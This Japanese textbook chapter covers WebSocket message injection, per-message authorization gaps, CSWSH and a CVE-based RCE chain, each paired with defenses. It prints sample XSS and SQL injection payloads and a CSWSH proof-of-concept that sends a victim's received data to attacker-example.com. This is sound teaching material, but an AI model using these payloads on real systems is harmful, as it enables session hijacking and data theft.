# 第8章 WebSocketの他の脆弱性

## メッセージ経由インジェクションと認可欠如

WebSocket は「ハンドシェイクさえ突破すれば安全な通信路が手に入る」プロトコルではない。ハンドシェイク後に流れる **メッセージ（フレーム）** それ自体が、HTTP のリクエストボディやクエリパラメータと同じ意味での「信頼できない入力」であり、そこにアプリケーションのロジックが直接触れる。本節では、(1) メッセージがどのような sink（入力が最終的に実行・解釈される危険な代入先）に流れ込むことでインジェクション（XSS・SQLi・コマンドインジェクションなど）を引き起こすか、(2) なぜ多くの実装で「ハンドシェイク時にしか認可を確認しない」設計になりがちで、それがどう IDOR（Insecure Direct Object Reference、直接オブジェクト参照の認可欠如）やセッション管理の欠陥につながるかを、仕組みのレベルで解説する。

### メッセージはHTTPリクエストと同じ「入力」である

WebSocket は最初 HTTP の `GET` リクエストとして始まり、サーバーが `101 Switching Protocols` を返すことでプロトコルが TCP 上の生のフレーム通信に「アップグレード」される。重要なのは、このアップグレード後の通信路には HTTP のような構造化された検証層（Content-Type、CSRF トークン検証ミドルウェア、WAF のルールセットなど)が同じ強度では適用されないことが多い、という運用上の実態である。OWASP の Web Security Testing Guide (WSTG) は WebSocket のテスト方針を次のように要約している。

> WebSocket はクライアントとサーバーの間に「全二重（full-duplex）」の通信チャネルを作り、両者が真に非同期に通信できるようにする。WebSocket は最初の Upgrade ハンドシェイクを HTTP 上で行い、以後の通信はすべて TCP チャネル上のフレームを用いて行われる。

そして、WebSocket 自体は **認証・認可の仕組みを持たない** ことをはっきり述べている。

> WebSocket は認証を扱わない。通常のブラックボックス認証テストを実施すべきである。WebSocket は認可を扱わない。通常のブラックボックス認可テストを実施すべきである。

> 出典: OWASP WSTG「Testing WebSockets」— https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/10-Testing_WebSockets

これが本節の出発点になる。WebSocket プロトコル仕様（RFC 6455）自体は「メッセージの中身をどう扱うか」に一切関知しない。認証・認可・入力検証はすべてアプリケーション層の責務であり、実装者がハンドシェイク時のセッションチェックだけで満足してしまうと、確立済みのコネクション上を流れる個々のメッセージに対する検証が抜け落ちる。これが本節で扱う 2 つの脆弱性群――メッセージ経由インジェクションと、メッセージ単位の認可欠如――の共通の根っこである。

### メッセージ経由のインジェクション：XSS・SQLi・コマンドインジェクション

HTTP の世界で起こりうる入力系の脆弱性は、ほぼそのまま WebSocket メッセージでも発生しうる。sink（危険な代入先）が「HTTP レスポンスボディに書き込まれる」か「WebSocket フレームとしてブロードキャストされる」かの違いだけで、根本原理は同じである。

#### 反射・蓄積型 XSS

チャットやライブサポートのようなアプリケーションでは、あるユーザーが送信したメッセージを他のユーザーのブラウザにそのまま転送（ブロードキャスト）することが多い。サーバー側でエスケープせずに転送し、クライアント側で `innerHTML` のような危険な DOM API に流し込むと、送信者が仕込んだスクリプトが受信者のブラウザ上で実行される。

```json
{"message": "<img src=x onerror=alert(document.cookie)>"}
```

このペイロードが sink（ここでは受信側の `innerHTML` 相当の描画処理）に到達すると、`src=x` の画像読み込みが失敗した瞬間に `onerror` ハンドラが発火し、任意の JavaScript が受信者のオリジンで実行される。cookie が `HttpOnly` でなければ盗み出せるし、キーロガーの仕込み（`document.onkeypress` にハンドラを追加して打鍵内容を再度 WebSocket 経由で外部送信する等）も可能になる。防御側の要点は、HTTP のときと同じで「出力時にコンテキストに応じたエスケープを行う」ことと、CSP（Content-Security-Policy）でインラインスクリプトの実行余地を狭めることである。

> 出典: aw-junaid/bug-bounty「Web Sockets」チートシート — https://github.com/aw-junaid/bug-bounty/blob/main/resources/cheatsheets/Web%20Sockets.md

#### SQL インジェクション

WebSocket メッセージの JSON フィールドがそのままバックエンドの SQL クエリに文字列連結されているケースも珍しくない。

```json
{"search": "test' UNION SELECT password FROM users--"}
```

これは HTTP パラメータで起こる UNION ベースの SQLi と全く同じ原理で動作する。検索語として渡した文字列がクエリの構文の一部として解釈されてしまうため、`UNION SELECT` で別テーブルの列（ここでは `users.password`）を検索結果に混入させて窃取できる。ブール条件やタイムベース（`SLEEP()` 等の遅延関数を使い、レスポンス時間の差から真偽を推測する）のブラインド SQLi も同様に成立する。チートシートが挙げる実例では、取引プラットフォームが `symbol`（銘柄コード）パラメータをパラメータ化クエリを使わずに直接連結しており、WebSocket メッセージに埋め込んだ `UNION SELECT` 文でクレジットカード情報 5 万件超が抜き取られたとされている。防御はやはり HTTP の場合と同じで、プレースホルダ付きのプリペアドステートメント（パラメータ化クエリ）を使い、ユーザー入力を SQL 構文の一部として解釈させないことに尽きる。

#### コマンドインジェクション・メッセージ分割

サブプロトコルやカスタムテキストプロトコルを自前でパースしている実装では、改行文字やヌルバイトを区切り文字として使っているケースがある。攻撃者がメッセージ本文に区切り文字を混入させると、パーサーが「1 つのメッセージ」のつもりで処理していた入力が、実は複数のコマンドとして解釈されてしまう「メッセージ分割」が起こりうる。WebSocket のフレーム自体は長さプレフィックス方式（フレームヘッダにペイロード長が明示される）なのでプロトコルレベルでの分割は起きにくいが、**アプリケーション層で独自に区切り文字ベースのミニプロトコルを実装している場合**に同種の問題が再燃する。対策は、区切り文字に依存せず、構造化されたシリアライズ形式（JSON など）と厳格なスキーマ検証を使うことである。

> 出典: aw-junaid/bug-bounty「Web Sockets」チートシート — https://github.com/aw-junaid/bug-bounty/blob/main/resources/cheatsheets/Web%20Sockets.md

### メッセージ単位の認可欠如（IDOR）

WebSocket 特有の落とし穴として最も実害が大きいのが、**「認証・認可はハンドシェイク時に一度だけ確認し、その後の個々のメッセージには適用しない」** という実装パターンである。これは HTTP であれば毎リクエストごとにミドルウェアがセッションと権限をチェックするのが当たり前だが、WebSocket は「コネクションが 1 つ確立されたらそのまま張りっぱなし」という性質上、開発者が「接続できた=そのユーザーは認証済みで、以後のメッセージも全部そのユーザーのもの」という誤った前提を置きやすい。しかしメッセージの中身（どのリソースにアクセスするか）はクライアントが自由に指定できるため、コネクション確立後もリクエストごとの認可判定を行わなければ IDOR が成立する。

```json
{"action": "get_messages", "user_id": "admin"}
```

```json
{"document_id": "private_doc_123", "action": "read"}
```

上の例では、接続自体はごく普通のユーザーとして確立されているにもかかわらず、メッセージ本文の `user_id` や `document_id` を書き換えるだけで他人のリソースを取得できてしまう。サーバー側が「このコネクションの持ち主が本当にその `user_id` / `document_id` にアクセスしてよいか」を毎メッセージ検証していないために起こる。チートシートに挙がる実例では、あるコラボレーションプラットフォームが認証をコネクション確立時にしか検証しておらず、その後のメッセージで `document_id` を書き換えることで他人の非公開ドキュメントに次々アクセスできたという。テスト観点としては、被害者アカウントと攻撃者アカウントを両方作成し、攻撃者のコネクション上で被害者のリソース ID を指定したメッセージを送り、データが返るかどうかを確認する（本教科書は防御目的であるため、実運用サービスに対する無許可の検証は行わないこと）。

> 出典: aw-junaid/bug-bounty「Web Sockets」チートシート — https://github.com/aw-junaid/bug-bounty/blob/main/resources/cheatsheets/Web%20Sockets.md

防御側の要点は単純明快で、**「メッセージを処理する関数の内部で、そのメッセージが要求するリソースに対してこのコネクションの持ち主がアクセス権を持つかを毎回再検証する」** ことである。HTTP でいうところの「エンドポイントごとの認可チェック」を、WebSocket では「メッセージハンドラごとの認可チェック」に読み替える必要がある。

### セッション管理：ゾンビ接続とクッキー継承

もう一つの根深い問題は、WebSocket コネクションが **HTTP セッションのライフサイクルと同期していない** ことに起因する。

- ハンドシェイク時、ブラウザは自動的にそのオリジンの Cookie を Upgrade リクエストに付与する。これは通常の HTTP リクエストと同じ挙動であり、サーバー側はこの Cookie を見てセッションを認証する。
- 一度コネクションが確立されると、たとえその後に対応する HTTP セッションが失効（ログアウト、タイムアウト、トークン失効）しても、既に張られている WebSocket コネクションは自動的には切断されない。これがいわゆる「ゾンビ接続」であり、失効したはずの認証情報がコネクションの上に生き残り続ける。
- 逆に、Cookie を外してハンドシェイクを送ってみて接続が確立してしまう場合、そのアプリケーションは実質的に「誰でも」WebSocket 経由でアクセスできる、つまり認証をまったく行っていないことが判明する。

対策としては、メッセージごとにセッションの有効性を再検証すること、セッションが無効化されたタイミングでサーバー側から該当コネクションを能動的にクローズすることが挙げられる。

### サブプロトコルという別の攻撃面

`Sec-WebSocket-Protocol` ヘッダはクライアントとサーバーの間でアプリケーション層のサブプロトコル（`soap`、`wamp`、`mqtt` など）をネゴシエートするために使われる。これらのサブプロトコルはそれぞれ独自のメッセージフォーマットとパーサーを持つため、WebSocket 自体は安全でも、ネゴシエートされたサブプロトコルの実装に起因する脆弱性（SOAP 実装の XML パース不備、メッセージルーティングにおける認証バイパス、独自エンコーディングのデコード処理のバグなど）が新たな攻撃面を作る。カスタムサブプロトコルを実装する場合は、WebSocket そのものの検査だけでなく、そのサブプロトコルのパーサー・状態機械に対する個別のセキュリティレビューが必要になる。

### ハンドシェイクの操作とインジェクション対策の回避

PortSwigger の Web Security Academy には、ハンドシェイクの操作によって脆弱性を悪用するラボが用意されている。このラボが示す論点は、ハンドシェイク（HTTP リクエストとして送られる Upgrade リクエスト）自体もアプリケーションのロジックに影響を与える「入力」だということである。たとえば、IP 制限やレート制限が `X-Forwarded-For` のようなクライアントが自由に偽装できるヘッダを信頼して判定を行っていると、ハンドシェイク時にこのヘッダを書き換えるだけで制限を回避できてしまう。また、メッセージ本文に対する XSS フィルタが単純な文字列一致（`onerror` などの禁止語リスト方式）に依存している場合、大文字小文字を混在させる（`oNeRrOr`）、テンプレートリテラル（バッククォート文字列）を使うなど、フィルタが想定していない表記ゆれで容易にバイパスされる。これは「ブラックリスト方式の入力検証は網羅的になりえない」という、Web セキュリティ全般に通じる原則の WebSocket 版である。本書はラボの攻略手順そのものは扱わないが、押さえるべき設計原則は次の 2 点に整理できる。

1. **クライアントが送信できるヘッダやメッセージ内容を、アクセス制御やフィルタリングの判断材料として信頼しない。** IP 制限を行うなら、リバースプロキシが上書きする信頼済みヘッダのみを使い、エンドユーザーが自由に設定できるヘッダは無視する。
2. **入力検証はブラックリストではなくホワイトリスト、かつ出力側のエスケープと二重に行う。** メッセージの中身をそのまま DOM に描画する設計自体を避け、テンプレートエンジンや DOM API のエスケープ機能（`textContent` の使用、フレームワークの自動エスケープなど）に処理を委譲する。

> ⚠️ **未取得の資料の補足**: PortSwigger のラボページ自体はラボ固有の攻略手順（解答）を中心に構成されており、本教科書のスコープ外である「ラボ攻略」に該当するため、具体的な突破手順の引用は行っていない。上記の一般原則は、（以下は未取得資料の補足として一般知識に基づく解説です）PortSwigger の Web Security Academy がハンドシェイク操作系の脆弱性について繰り返し強調している「サーバー側でクライアント制御可能な入力を信頼しない」という設計原則に基づく。詳細はご自身で直接ご覧ください: https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities

### テスト手法とツール

OWASP WSTG は WebSocket のテスト方針として「通常の HTTP チャネルに対して行うのと同じテストを適用する」ことを基本方針として掲げている。具体的な識別方法としては、クライアント側のソースコードで `ws://` / `wss://` の URI スキームを探す、ブラウザの開発者ツールの Network パネルで WebSocket 通信を確認する、といった手順が挙げられている。

> 出典: OWASP WSTG「Testing WebSockets」— https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/10-Testing_WebSockets

実務でよく使われるツールとしては、Burp Suite の WebSocket 用プロキシ機能（確立済みコネクション上を流れるメッセージをインターセプト・書き換えて再送できる）、フレームワーク非依存のフレンドリーな CLI クライアントである `wscat`、WebSocket 実装のフィンガープリンティングとファジングに特化した STEWS などが挙げられる。テストの基本的な進め方は、(1) ハンドシェイクリクエストの `Origin` ヘッダを攻撃者側のオリジンに書き換えて `101 Switching Protocols` が返るか確認する（CSWSH の検査。詳細は本章の別節を参照）、(2) 確立済みコネクション上で送るメッセージの識別子（ユーザー ID、ドキュメント ID など）を別のユーザーのものに書き換えて認可欠如がないか確認する、(3) メッセージのフィールドに `'`（シングルクォート）や `<script>` のようなマーカーを注入し、エラーメッセージの変化や実行結果からインジェクションの可能性を判定する、という順序になる。

### まとめ：防御のチェックリスト

- WebSocket プロトコル自体は認証・認可の仕組みを提供しないため、アプリケーション層で明示的に実装する必要がある。
- 認可判定はハンドシェイク時の一度きりではなく、**メッセージハンドラごとに毎回** 行う。
- メッセージの中身は HTTP パラメータと同格の信頼できない入力として扱い、SQL クエリはパラメータ化、DOM への描画は文脈に応じたエスケープを行う。
- セッションが失効したら、対応する WebSocket コネクションをサーバー側から能動的にクローズし、ゾンビ接続を残さない。
- クライアントが自由に設定できるヘッダ（`X-Forwarded-For` など）をアクセス制御の根拠にしない。
- サブプロトコルを独自実装する場合は、そのパーサー・状態機械を個別に評価する。
- ブラックリスト方式のフィルタは表記ゆれで容易にバイパスされるため、ホワイトリスト方式の検証と出力エスケープを併用する。

## 学術サーベイ・Protobuf SQLi・未認証RCEチェーン

本節では、WebSocket の脆弱性を「点」ではなく「面」として捉えるための素材を 3 つ取り上げる。(1) WebSocket の攻撃面を体系立てて概観した学術サーベイ、(2) バイナリシリアライズ（Protobuf）で難読化された WebSocket 通信の奥に潜んでいた SQL インジェクションの実例、(3) 2 つの CVE を連鎖させて「未認証のリモートコード実行（RCE）」まで到達した実在製品の事例、である。いずれも「防御側が何を検査し、どこを固めるべきか」を理解するための教材として扱う。実在サービスや本番環境への無許可検証・破壊的手順は本書の対象外であり、記述しない。

まず用語を整理しておく。

- **WebSocket ハンドシェイク**: 最初は普通の HTTP リクエスト（`GET ... Upgrade: websocket`）としてサーバに接続し、サーバが `101 Switching Protocols` を返すと、以降は同じ TCP コネクション上で双方向（全二重）のフレーム通信に切り替わる仕組み。
- **sink（シンク）**: 攻撃者が注入した入力が、最終的に実行・解釈される危険な代入先。SQL クエリ文字列、OS コマンド行、`eval` などがこれにあたる。
- **CSWSH（Cross-Site WebSocket Hijacking）**: 攻撃者のサイトから被害者のブラウザを使って、被害者のクッキー（セッション）付きで標的の WebSocket に接続させ、正規ユーザーになりすます攻撃。CSRF の WebSocket 版と考えるとよい。

### 学術サーベイ：WebSocket の攻撃面を俯瞰する

Saeid Ghasemshirazi と Pouya Heydarabadi による論文 *"Exploring the Attack Surface of WebSocket"*（arXiv:2104.05324）は、WebSocket の歴史・性能・フレーム構造から出発し、セキュリティ上の弱点を体系的に整理した入門的サーベイである。実装バグの新発見というより、「WebSocket というプロトコルが本質的にどこに攻撃面を持つのか」を教科書的にまとめた一次資料として価値がある。

#### プロトコルの基礎と、なぜ攻撃面になるのか

論文はまず、WebSocket が HTML5 の一機能として設計され、最終版が 2011 年 12 月にリリースされたこと、単一の TCP コネクションで HTTP ポーリングを置き換える双方向通信を実現することを述べる。非暗号化は **ポート 80（`ws://`）**、暗号化は **ポート 443（`wss://`）** を使う。

接続はまず HTTP の「アップグレード（handshake）」として始まる。クライアントは次のようなヘッダを送る。

```http
GET /chat-client HTTP/1.1
Host: yourhost.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: c29lZXRoaXNpc2Ftb2NrZXk=
Sec-WebSocket-Version: 13
```

サーバが合意すると `101 Switching Protocols` と `Sec-WebSocket-Accept` を返し、以降は HTTP を離れてフレーム単位のバイナリ通信になる。**この「一度ハンドシェイクを通せば、あとは HTTP のリクエスト単位のセキュリティ制御（CSRF トークン検証など）が効かない持続的チャネルになる」という性質が、WebSocket 特有の攻撃面の根源**である。論文が「セキュリティ制御の多くは開発者の手に委ねられており、時間不足や不注意によって脆弱性が生まれる」と繰り返し指摘するのはこのためだ。

フレーム構造も攻撃面の理解に効く。WebSocket フレームは opcode、MASK ビット、Payload len（7 ビット＋拡張 16/64 ビット）、Masking-key、Payload Data から成る。**クライアント→サーバのフレームはマスキング必須**で、4 バイトの Masking-key と Payload を XOR してから送る。これはキャッシュ汚染などのプロキシ混乱を防ぐための措置であって、機密性・完全性を守る暗号ではない点に注意する（機密性は `wss://` の TLS が担う）。

#### 論文が挙げる 3 つのセキュリティ観点

論文は WebSocket セキュリティを主に次の観点で論じる。

**(A) 認証・認可（Authentication / Authorization）**
WebSocket は固有の認証方式を持たず、多くの実装は HTTP の `Set-Cookie` に依存する。そのため認可の強度は「開発者の姿勢」次第になる。論文は、認可が甘い場合に起こりうる状態として次の 3 つを挙げる。

- 攻撃者が、本来は上位権限が必要な機能を権限なしで実行できる
- 攻撃者が他ユーザーのコンテンツを閲覧できる（水平方向のアクセス制御不備）
- 攻撃者が無制限にアクセスできる

これは GraphQL の章で扱った「認可はトランスポートではなくアプリ層で判断せよ」という原則と地続きである。

**(B) 同一オリジンポリシー（SOP）と CSWSH**
論文は SOP の filter を「ポート番号／プロトコル／ドメイン」で説明する。重要なのは、**WebSocket ハンドシェイクにおける `Origin` ヘッダの検証がブラウザ任せ・サーバ実装任せである**点だ。`Origin` を `*`（全ドメイン許可）にしたり、そもそも検証しなかったりすると、攻撃者サイトからの接続を弾けない。

論文が示す CSWSH（論文表記は CSWH）のシナリオはこうだ。攻撃者は被害者を悪意あるページに誘導し、そのページ内の JavaScript から標的の WebSocket へ接続する。ブラウザは同一サイト宛の接続にクッキーを自動付与するため、`Origin` を見ていないサーバは被害者のセッションで接続を確立してしまう。

```html
<html>
  <body>
    <script>
      var ws = new WebSocket("wss://examplesite.org/chat");
      ws.onopen = function () {
        ws.send("attacker message");   // 被害者のセッションで送信できてしまう
      };
      ws.onmessage = function (event) {
        // 受信した被害者のデータを攻撃者サーバへ持ち出す
        fetch("https://attacker-example.com", { method: "POST", body: event.data });
      };
    </script>
  </body>
</html>
```

**なぜ成立するのか**: WebSocket ハンドシェイクは「Cookie ベース認証」と「Origin をサーバ側で必須検証しない実装」の組み合わせで、CSRF 対策（トークンや SameSite）が抜けているとブラウザの自動クッキー送信をそのまま悪用できる。論文はこれを「CSRF の一種であり、攻撃者は被害者の資格情報で何でもできてしまう。金銭取引・リアルタイム処理・データ通信のような重要操作では特に危険」と位置づける。

**(C) トラフィック暗号化と Sec-WebSocket-Key**
論文は、デフォルトの `ws://`（ポート 80）は非暗号化で MITM に晒されるため、必ず `wss://`（TLS）を使うべきだと述べる。また `Sec-WebSocket-Key` は 16 バイトのランダム値を base64 化した **nonce（使い捨ての乱数）** であり、サーバはこれに固定の「マジック文字列」`258EAFA5-E914-47DA-95CA-C5AB0DC85B11` を連結して SHA-1 を計算し、base64 化して `Sec-WebSocket-Accept` として返す、と正確に記述している。

```text
Sec-WebSocket-Accept = base64( SHA-1( Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11" ) )
```

**なぜマジック文字列が固定なのか**: これは暗号的な秘密ではなく、「相手が本当に WebSocket プロトコルを理解しているか」を確認し、キャッシュやプロキシが古いレスポンスを流用するのを防ぐためのハンドシェイク検証にすぎない。認証にも機密性保護にも一切寄与しない点を、防御側は取り違えてはいけない。

#### 論文が推奨する防御

論文が結論で挙げる対策は次の通り。いずれも「開発者が明示的に実装しないと効かない」ものである。

- ハンドシェイク時に **`Origin` を厳格に検証**する（`*` を使わず、許可ドメインのホワイトリストで判定）
- **CSRF トークン**を導入し、サーバが発行したランダム値を持たない接続は確立させない
- 通信は **`wss://`（TLS）のみ**を許可する
- 受信メッセージを**必ず検証・サニタイズ**する（入力バリデーションと出力エンコード）
- 接続確立レートとメッセージ流量を**レート制限**し、DoS を緩和する
- 認証状態の検証とロギング／監視を継続する

なお、この論文は概観サーベイであり、具体的な統計値（脆弱アプリの割合など数値）は本文中に明示されておらず、「多くの実装が Origin 検証と入力サニタイズを欠く」という定性的な指摘に留まる。数値的エビデンスを求める場合は、後続の実測研究（例: フレームワークのデフォルト設定を調べた調査）を併読するとよい。

> 出典: Exploring the Attack Surface of WebSocket (Saeid Ghasemshirazi, Pouya Heydarabadi) — https://arxiv.org/pdf/2104.05324

### 実例：Protobuf 越しの隠れた SQL インジェクション

> ⚠️ **未取得の資料**: 「WebSockets, Protobuf, and a Hidden SQL Injection: My Unexpected Bug Hunting Journey」（MOAMEN REZK, Medium）は自動取得できませんでした（理由: Medium が HTTP 403 Forbidden を返し、freedium/scribe などのミラーも解決不可）。以下の URL からご自身で直接ご覧ください: https://medium.com/@momenrezkk90/websockets-protobuf-and-a-hidden-sql-injection-my-unexpected-bug-hunting-journey-c22e935cca72

（以下は未取得資料の補足として、記事の公開要旨と、記事が依拠したツール `blackbox-protobuf` の一次ドキュメントに基づく一般知識の解説である。防御的観点から、攻撃の完全手順ではなく「なぜ成立し、どう守るか」を中心に述べる。）

#### 何が起きたのか（要旨）

筆者 Rezk は、あるアプリの WebSocket 通信をプロキシで観察したところ、ペイロードが **JSON ではなくバイナリのブロブ**であることに気づく。調査の結果、アプリは Google の **Protocol Buffers（Protobuf）** を使っていた。Protobuf はスキーマ（`.proto` 定義）に従ってフィールドを詰めた**コンパクトなバイナリ直列化形式**で、`.proto` がなければ人間には読めない。これが「隠れた SQLi」の温床になった。ポイントは 3 つ。

1. **可読ペイロードがない**: Protobuf をデコードしない限り、リクエストは生バイナリにしか見えず、脆弱性が視認できない。
2. **ツールに追加設定が必要**: Burp Suite は素のままでは Protobuf を復号できず、専用拡張が要る。
3. **改ざんが壊れやすい**: サーバが整合性チェックやランダム署名を使っており、雑にバイトを書き換えると弾かれる。

筆者はこれらを乗り越えて、Protobuf のとあるフィールドが最終的に SQL クエリの sink に流れていることを突き止め、SQL インジェクションを報告して Hall of Fame（殿堂）入りした。**教訓は「バイナリ・独自プロトコル・難読化があっても、伝統的な脆弱性（SQLi）は消えない。むしろ可視性が下がる分、見逃されやすい」**ということである。

#### なぜ Protobuf 越しでも SQLi が成立するのか（仕組み）

Protobuf はあくまで「転送時の詰め方（エンコーディング）」であって、値そのものは変えない。サーバはバイナリを**デシリアライズ**して各フィールドを取り出し、その文字列を（多くの場合）通常のアプリロジックに渡す。もしそのフィールドがパラメータ化されずに SQL 文へ連結されていれば、Protobuf を通ってきた文字列であろうと `' OR '1'='1` のような入力はそのまま SQL の構文として解釈される。**トランスポートがバイナリでも、sink（SQL 実行箇所）の防御が甘ければ結果は同じ**なのだ。難読化は「防御」ではなく「視界の悪化」にすぎない。

#### テスト（分析）のためのツール機構：blackbox-protobuf

記事の技術的核心は「`.proto` 定義を持たずに Protobuf を復号・再構成する」点にある。これを可能にするのが NCC Group の **blackbox-protobuf** という Burp 拡張である。その一次ドキュメントによれば、動作原理はこうだ。

- **スキーマ無しでの復号**: Protobuf の**ワイヤーフォーマット（wire format）** の構造だけを頼りに、定義ファイルなしでメッセージを解析する。各フィールドは「フィールド番号＋ワイヤー型」というメタ情報を持つため、意味（フィールド名）は分からなくても構造は復元できる。
- **番号付き JSON への写像**: メッセージは「フィールド番号をキーにした JSON 辞書」に変換される。元のフィールド名は失われるため、`1`, `2`, `3` … という番号が識別子になる。
- **ワイヤー型の分類**: Varint（uint/int/sint）、固定長（fixed32/64, float, double）、長さ区切り（bytes/string/message/packed）などを認識し、「同じワイヤー型のカテゴリ内であれば型を付け替えられる」。
- **Validate（検証）＝再エンコード確認**: 「Validate」ボタンは「改変した JSON メッセージが再エンコード可能か」を検証する。送信前にこれで妥当性を確かめることで、壊れたバイナリを送ってしまう事故を防ぐ。

分析者はこの JSON 上で、たとえば「フィールド `5`（string 型）」の値を試験文字列に差し替え、Validate で再エンコードできることを確認してから送る。**同じワイヤー型の中で値を書き換える限り、Protobuf の構造は保たれ、サーバは正常なメッセージとして受理する**。これが「難読化の壁」を越える仕組みである。

```text
# blackbox-protobuf が復号したメッセージのイメージ（フィールド番号がキー）
{
  "1": "search",
  "2": "2026-09",
  "5": "keyword"     ← ここが string 型。値を差し替えて Validate → 送信
}
```

なお記事の環境では、サーバが**整合性チェックとランダム署名**を用いていたとされる。これはリクエスト本文にハッシュや署名フィールドを含め、改ざんを検知する仕組みで、「バイトを書き換えると壊れる」原因になる。防御側にとっては、こうした署名は改ざん検知として有効だが、**署名検証を通過した後の値に対して sink 側のパラメータ化を怠れば、SQLi は依然として成立する**ことに注意が必要だ（署名は「誰が送ったか・改ざんされていないか」を守るが、「値が安全か」は保証しない）。

#### 防御

- **Protobuf のフィールド値も信頼しない**: バイナリ・独自シリアライズは防御ではない。デシリアライズ後の全フィールドを、通常の入力と同じくバリデーションする。
- **パラメータ化クエリ（プリペアドステートメント）を徹底**する。sink での文字列連結を根絶すれば、経路が WebSocket でも Protobuf でも SQLi は成立しない。
- **署名／整合性チェックと入力検証を混同しない**。署名は完全性のためであって、注入対策にはならない。
- 監視の観点では、**バイナリ WebSocket は WAF/IDS の可視性が落ちる**ため、アプリ層でのパラメータ化と入力検証を最終防衛線と位置づける。

> 出典: WebSockets, Protobuf, and a Hidden SQL Injection: My Unexpected Bug Hunting Journey (MOAMEN REZK) — https://medium.com/@momenrezkk90/websockets-protobuf-and-a-hidden-sql-injection-my-unexpected-bug-hunting-journey-c22e935cca72
> 参考（ツール一次資料）: blackboxprotobuf Burp README (NCC Group) — https://github.com/nccgroup/blackboxprotobuf/blob/master/burp/README.md

### 未認証 RCE チェーン：CVE-2020-25094 ＋ CVE-2020-25095（LogRhythm Platform Manager 7.4.9）

最後に、WebSocket の弱点が単体では中程度でも、連鎖すると「未認証 RCE」という最悪級の結果になる実例を見る。対象は SIEM 製品 **LogRhythm Platform Manager 7.4.9**（2020 年 12 月 17 日公表）。ここでは 2 つの CVE が組み合わさる。

#### CVE-2020-25094：WebSocket 経由の OS コマンドインジェクション

- **概要**: 「LogRhythm Platform Manager 7.4.9 allows Command Injection. To exploit this, an attacker can inject arbitrary program names and arguments into a WebSocket.（WebSocket に任意のプログラム名と引数を注入できる）」
- **仕組み**: 注入されたコマンドは、**LogRhythm Smart Response エージェント**がインストールされた任意のリモートサーバへ転送され、**デフォルトで LocalSystem 権限**（Windows の最高権限）で実行される。
- **CVSS 3.1**: 基本値 **9.8（CRITICAL）**、ベクトル `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **CWE**: CWE-78（OS コマンドで使われる特殊要素の不適切な無害化＝OS Command Injection）

**なぜ危険か**: `AV:N`（ネットワーク越し）、`AC:L`（攻撃条件が低い）、`PR:N`（権限不要）、`UI:N`（利用者操作不要）というベクトルが示す通り、ネットワークから前提条件なしで攻撃でき、成功すれば機密性・完全性・可用性のすべてが全損（C:H/I:H/A:H）する。WebSocket というアプリ制御チャネルに「コマンド名＋引数」を素通しで受け付ける設計そのものが sink になっている。

#### CVE-2020-25095：Origin 検証なし＝CSWSH（CSRF）を許す入口

- **概要**: 同じ Platform Manager 7.4.9 に存在する **CSRF（Cross-Site Request Forgery）** 系の脆弱性。**CVSS 3.1 基本値 8.8**。
- **仕組み**: WebSocket エンドポイントが **`Origin` 検証を行わずに接続を受け入れる**ため、攻撃者のサイトから被害者ブラウザ経由でのクロスサイト WebSocket 接続（CSWSH）が成立してしまう。

これは前掲の学術サーベイが警告していた「`Origin` を検証しないハンドシェイク」の実物である。25095 単体では「なりすまし接続ができる」だけだが、**25094 という強力な sink（コマンド実行）と組み合わさると意味が一変する**。

#### 連鎖：CSWSH（入口）× コマンドインジェクション（実行）＝未認証 RCE

チェーンの筋書きはこうだ。

1. 攻撃者は悪意あるページを用意し、標的製品にログイン済み（同一ブラウザ）の被害者を誘導する。
2. **CVE-2020-25095**: ページ内 JavaScript が標的の WebSocket に接続する。`Origin` が検証されないため、被害者のセッションで接続が確立する（CSWSH＝入口）。
3. **CVE-2020-25094**: 確立した WebSocket 上に「任意のプログラム名と引数」を注入する。これが Smart Response エージェント群へ転送され、**LocalSystem 権限で実行**される（コマンドインジェクション＝ペイロード）。
4. 結果、**認証情報を一切持たない攻撃者が、悪意あるページとログイン済み被害者さえいれば RCE を達成**する。

**なぜ「未認証」なのか**: 攻撃者自身は標的にログインしていない。認証を持っているのは被害者で、その資格情報（クッキー）をブラウザが自動送信することで、攻撃者は間接的に認証済みチャネルを乗っ取る。CSWSH の本質がここに凝縮されている。単体の弱点（Origin 未検証、コマンド素通し）が、連鎖すると CVSS 9.8 の破壊力になる好例である。

#### 防御（この事例が示す設計原則）

- **入口を塞ぐ**: WebSocket ハンドシェイクで `Origin` を厳格に検証し、CSRF トークンや `SameSite` クッキーを併用する。CSWSH が成立しなければ、下流の sink があっても外部から到達できない。
- **sink を塞ぐ**: 「プログラム名と引数を WebSocket から受け取って実行する」設計自体を廃し、実行対象を固定のホワイトリストに限定する。ユーザー入力を OS コマンド行へ連結しない（CWE-78 の根本対策）。
- **多層で守る**: 入口（認可・Origin）と出口（コマンド構築・引数分離・最小権限）の両方を固める。LocalSystem のような過剰権限で実行しない（最小権限の原則）。
- **バージョン管理**: 対象は 7.4.9。ベンダの修正版へ更新すること。時事性のある脆弱性であり、影響有無は導入バージョンで判断する。

> 出典: CVE-2020-25094 (NVD) — https://nvd.nist.gov/vuln/detail/CVE-2020-25094
> 参考: CVE-2020-25094 詳細（CVSS ベクトル・CWE） — https://www.strix.ai/cve/CVE-2020-25094 ／ CVE-2020-25095 — https://nvd.nist.gov/vuln/detail/CVE-2020-25095

### 本節のまとめ

- **学術サーベイ**は、WebSocket の攻撃面が「一度ハンドシェイクを通すと HTTP 単位の制御が効かない持続チャネルになる」ことに由来すると教える。防御の要は Origin 厳格検証・CSRF トークン・`wss://`・入力検証・レート制限で、いずれも開発者が明示実装しなければ効かない。
- **Protobuf SQLi の実例**は、バイナリ・独自シリアライズが「防御」ではなく「視界の悪化」にすぎないことを示す。sink（SQL 実行箇所）のパラメータ化を怠れば、経路が何であれ SQLi は成立する。署名・整合性チェックは完全性のためで、注入対策にはならない。
- **CVE-2020-25094/25095 の連鎖**は、「Origin 未検証（入口）」×「コマンド素通し（sink）」が組み合わさると未認証 RCE（CVSS 9.8）になる実物である。入口と出口を独立に固め、最小権限で実行することが設計原則となる。

